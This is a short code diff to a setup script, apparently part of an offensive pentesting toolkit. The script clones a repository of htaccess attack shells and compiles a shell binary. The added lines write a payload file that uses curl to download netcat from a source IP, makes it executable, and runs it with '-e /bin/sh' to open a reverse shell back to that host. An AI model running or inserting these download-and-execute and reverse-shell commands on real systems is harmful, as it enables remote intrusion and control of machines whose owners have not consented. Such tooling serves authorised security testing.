@@ -59,8 +59,13 @@ gcc shell.c -o shell
         banner "payloads_linux - htshells - Self contained htaccess shells and attacks - https://github.com/wireghoul/htshells.git"
         git clone --depth=1 --recursive https://github.com/wireghoul/htshells.git
 
+        echo "curl http://$source_ip/tools_linux/nc -o /tmp/nc" >> nc_rev_shell.txt
+        echo "chmod +x /tmp/nc" >> nc_rev_shell.txt
+        echo "/tmp/nc $source_ip $source_port -e /bin/sh" >> nc_rev_shell.txt
+
         # Create all common shells in payloads_linux folder
         bash ../../_setup/setup_payloads.sh
+        
 
     fi
 
